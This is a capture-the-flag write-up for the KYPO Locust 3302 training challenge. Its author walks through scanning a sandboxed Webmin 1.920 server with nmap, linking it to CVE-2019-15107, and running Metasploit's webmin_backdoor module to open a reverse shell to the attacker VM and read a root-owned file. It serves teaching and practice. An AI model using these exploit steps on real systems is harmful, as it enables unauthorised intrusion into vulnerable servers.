# CTF Challenge Write Up :  KYPO Locust 3302 Challenge of Blackcat

**Design Purpose** : In the previous article *[How to Deploy KYPO_CRP on OpenStack-YOGA](https://www.linkedin.com/pulse/how-deploy-kypocrp-openstack-yoga-yuancheng-liu-zmjhc)*, I introduced how to deploy KYPO CRP on Open Stack cluster. This write-up will focus on the detailed steps of using the KYPO-CRP application and solving practical CTF questions through the KYPO Locust 3302 Challenge which used in the Blackcat CTF [Hacker and Defender Training] developed by Masaryk University’s Cybersecurity. 

This CTF challenge is designed as an advanced Web and Information security exam to test the CTF participants through  penetration testing workflows, web service vulnerability exploit , command injection attack and the information protection knowledge and skills taught in Masaryk University Cybersecurity course [PV276 Seminar on Simulation of Cyber Attacks Course](https://is.muni.cz/course/fi/autumn2020/PV276) . The Locust 3302 sandbox is publicly available as part of KYPO’s open-source releases on KYPO official Gitlab: [MUNI-KYPO-TRAININGS / games / locust-3302 · GitLab](https://gitlab.ics.muni.cz/muni-kypo-trainings/games/locust-3302) for people to practice hands-on cyber defense and offense techniques.

```python
# Author:      Yuancheng Liu
# Created:     2024/03/20
# Version:     v_0.1.2
# License:     MIT License
# Kyppo Disclarmer: This training topic is for educational purposes only.The story is fictitious.
```

**Table of Contents** 

[TOC]

------

### Introduction 

Before diving into the technical details of how to solve the Locust 3302 Blackcat Challenge, I would like to acknowledge and express thanks to the challenge authors — **Adam Chovanec**, **Hana Pospíšilová**, and **Peter Jaško** for designing such an engaging and thought-provoking CTF exercise. This challenge consists of six sequential tasks, each designed to test core cybersecurity skills across multiple domains, including the penetration testing, web vulnerabilities, command injection attacks, Linux system forensics, and cryptographic password cracking.

The tasks simulate realistic attacker-defender scenarios where participants must:

- **Penetration test and web security**: Use tools such as `Metasploit` to identify vulnerabilities in a web service.
- **Command injection attack**: Exploit `CVE-2019-15107` in the Webmin service (`password_change.cgi`) to gain remote access via a web shell.
- **Linux system critical information analysis**: Trace and analyze `bash command history` to extract sensitive information left by other users.
- **Encryption and decryption**: Leverage `John the Ripper (ssh2john)` to crack an SSH private key’s passphrase and gain deeper system access.

#### Challenge Background Story

Upon logging into the KYPO challenge page, participants are introduced to a narrative backdrop as shown below:

![](img/s_03.png)

This storyline provides context for the tasks, immersing players in a **red team vs. hacker group** investigation scenario: 

>  Infosec community all over the word has been investigating hacker group Black cat. This mysterious organization has been very active in the hacker scene and is believed to be responsible for several cyber-attacks.Recently you have acquired an IP address of one of their servers. Find out who they are and what do they do. These criminals have to be stopped!"

#### Environment and Network Topology

The challenge runs on the **KYPO CRP cyber range**, which simulates a multi-network environment with three interconnected VMs as shown below:

![img](img/s_04.png)

- **Attacker VM (10.10.135.83)** – A Kali-like environment preloaded with penetration testing tools. CTF participants will use this VM to launch attacks on the target systems.

- **Web VM (172.18.1.5)** – Located in the *outside-network*, this hidden web server hosts the vulnerable **Webmin** service.

- **Client VM (10.1.17.4)** – A protected server hidden behind the “big-broker” subnet. Hackers have already transferred stolen files here, and CTF participants must uncover its existence by analyzing evidence.

This layered design mimics a **real-world penetration test**, where attackers must pivot from one compromised system to another.

#### CTF Questions and Techniques

The challenge progresses through six structured questions, requiring participants to solve them step by step, the main techniques to solve the challenge questions are: 

- **Q1 – Scan the IP address and ports**: Use **Nmap** to identify running services and discover the **Webmin** interface.
- **Q2 – Identify a vulnerability**: Employ **Metasploit** to detect a web service vulnerability and link it to a related **CVE**.
- **Q3 – Exploit the vulnerability**: Execute a **command injection exploit** against Webmin to establish a foothold.
- **Q4 – Find the secret server’s IP address**: Analyze **Linux shell history** to reveal critical clues.
- **Q5 – Access the secret server**: Crack the **SSH private key’s passphrase** using **John the Ripper**.
- **Q6 – Steal secret information**: Adjust key permissions, log into the client server, and retrieve hidden data.

Now lets go through the detailed steps to solve the six CTF challenge questions one by one. 



------

### CTF Challenge Q1: Scan the IP Address and Ports

**Question Task:**

- The participants will act as a defender to find some cyber attack action evidence  of the Black cat members. 
- As one attacker, found some information from some Blackcat's document that the IP address (172.18.1.5 ) is hosting some of their service. See if the acquired IP address 172.18.1.5 leads anywhere.

#### Step 1: Get KYPO Environment SSH Access

From the KYPO CTF challenge page, go to topic 2 – Get Access and click **Get SSH Config** as shown below:

![](img/s_05.png)

This downloads a file `ssh-access.zip`. Extract it, then copy the key file named `pool-id-<your_file_id>-sandbox-id-<your_sandbox_id>-user-key` in to your into your `~/.ssh` directory.

Next, log into your assigned Kali Linux VM (called **transaction**) using the following command:

```bash
ssh -F pool-id-<your file id>-sandbox-id-<your sandbox id>-user-config transaction
```

For example:

![](img/s_06.png)

If successful, you will now have shell access to the **Kali Linux attacker VM** — the environment you will use for most of the tasks.

#### Step 2: Nmap Find the Task1 Flag

Inside your home folder, you’ll find a `flag.txt` file. Opening it will display the keyword "start". Enter `start` in the challenge portal to officially begin **Task 1**:

![](img/s_07.png)

To discover which services are running on the target server (`172.18.1.5`), use **Nmap** to scan the service of the target VM, In this task, we use the **`-sV`** option to detect the version of running services:

```
nmap -sV 172.18.1.5
```

If you want to focus only on a specific port, you can add the **`-p <port_number>`** parameter.

Example scan:

![](img/s_08.png)

Record the service information (Name, Version and Port ) for solving the further section questions. Based on the task description the the CTF challenge task 1 correct answer(flag) is:  **Webmin**



------

### CTF Challenge Q2: Identify a Vulnerability

**Question Task:**

- Perform penetration testing to identify vulnerabilities in the discovered web service and determine the associated **CVE** that can be used for exploitation.

#### Step 1: Use Metasploit to Find Known Vulnerabilities

From the **Nmap** scan in Task 1, we know that the target server is running **Webmin** on port **10000**:

```bash
└─$ nmap -sV 172.18.1.5
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-05 05:40 UTC
Nmap scan report for 172.18.1.5
Host is up (0.0026s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The version of Webmin in use is **1.920**. Our next step is to check whether this version is known to contain any security flaws.

A common approach in penetration testing is to use **SearchSploit**([usage example](https://bughacking.com/how-to-use-searchsploit-in-kali-linux/)), a tool bundled with Kali Linux that queries Exploit-DB for publicly available exploits.

Run the following command:

```
searchsploit Webmin
```

![](img/s_09.png)

This shows several entries, with two particularly relevant to our target version:

- `Webmin 1.920 - Remote Code Execution`
- `Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)`

#### Step 2: Identify the CVE to Find the Task2 Flag

Each known vulnerability is cataloged with a **CVE (Common Vulnerabilities and Exposures)** identifier. To find the specific CVE linked to Webmin 1.920, you can:

- Use [Exploit-DB](https://www.exploit-db.com/) or [cve.mitre.org](https://cve.mitre.org/).
- Or search online for “**Webmin 1.920 Remote Code Execution**.”

Google search the content `Webmin 1.920 - Remote Code Execution` or `Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)`, this is the 1st link Google provide: https://www.acunetix.com/vulnerabilities/web/webmin-v1-920-unauhenticated-remote-command-execution/. In the link we can find the CVE (CVE-2019-15107) information: 

![](img/s_10.png)

This vulnerability allows **unauthenticated attackers** to execute arbitrary commands remotely through a crafted request to `password_change.cgi`. See more at https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107

Fill in the flag **CVE-2019-15107** and submit to complete task 2: s

![](img/s_11.png)



------

### CTF Challenge Q3: Exploit the Vulnerability

Question Task:

- Use the **Metasploit framework** to exploit the discovered Webmin vulnerability (**CVE-2019-15107**) with a command injection attack.

- A leaked document from a BlackCat member named *Eve* indicates that their previous hacking attempts were logged in a file named `WARNING-READ-ME.txt`, located under a user’s folder, the flag may be in the file.

- Find the **five-digit number** hidden in `/root/WARNING-READ-ME.txt` on the target server. 

  

#### Step 1: Launch Metasploit and Select the Exploit

The tool you are looking for is called Metasploit which has been pre-installed in the Kali linus. Exploits in Metasploit are ready-made scripts that automatically attack a vulnerability. They save you time during penetration testing: you do not need to program or download custom exploits, but you simply use existing attack scripts that someone created for the common vulnerabilities. Check out the tutorial at https://www.offensive-security.com/metasploit-unleashed/metasploit-fundamentals/

Start metaplot console tool with cmd: `msfconsole`, the console will be shown as below:

![](img/s_12.png)

Then we need to search whether the metasploit provides the modules which can exploit the vulnerability point.  There is a search command in Metasploit (msfconsole) to find the correct exploit, search for available exploits related to Webmin:

```
search webmin
```

The result is shown below:

![](img/s_13.png)

From the results, we select the exploit:

```bash
exploit/linux/http/webmin_backdoor
```

This module directly targets **CVE-2019-15107**, the command injection flaw in Webmin’s `password_change.cgi`. Activate it using:

```bash
use exploit/linux/http/webmin_backdoor
show options
```

This will display the configurable parameters needed to run the exploit.



#### Step 2: Configure Exploit Options

Based on the previous step, each activated exploit has its options -- parameters that you must set after you activated the exploit but before you run it. The parameters we used to do the vulnerability scan are host and port configuration:  

- **RHOSTS** : The target host ip address, it needs to be set to the IP address of the victim, cmd :  `set RHOSTS 172.18.1.5`.
- **RPORT** : The target host tcp port, it needs to be set to desired port number, i.e., 10000.
- **LHOST** : The source host id address, needs to be set to the machine that initiates the exploit (you), cmd:  `set LHOST 10.10.135.83`.

Now set the target host when want to do penetration with **RHOST**, set our attack Kali machine as **LHOST**, and **RPORT** the one we find in section 1 which is 10000. Then use check cmd to see whether the http web service is is vulnerable by using the **webmin_backdoor module**.  Commands:

```
Exploit target:
msf6 exploit(linux/http/webmin_backdoor) > set RHOST 172.18.1.5
RHOST => 172.18.1.5
msf6 exploit(linux/http/webmin_backdoor) > set RPORT 10000
RPORT => 10000
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.10.135.83
LHOST => 10.10.135.83
msf6 exploit(linux/http/webmin_backdoor) > check
```

If configured correctly, Metasploit confirms that the service is vulnerable. Then, run the exploit:

```
exploit
```

Your terminal should display a **reverse shell session opened** message, as shown in the screenshot:

![](img/s_14.png)

This means you now have shell access to the target server through the backdoor.



#### Step 3: Locate the Evidence File

With shell access, navigate and search for the suspicious file mentioned in the challenge:

```
find /root -name "WARNING-READ-ME.txt"
cat /root/WARNING-READ-ME.txt
```

The result is shown below: 

![](img/s_15.png)

As shown above, the **user 25790**  is the flag information, enter this value into the challenge portal to complete Task 3:

![](img/s_16.png)

**> The correct answer(flag) is:**  `25790`



------

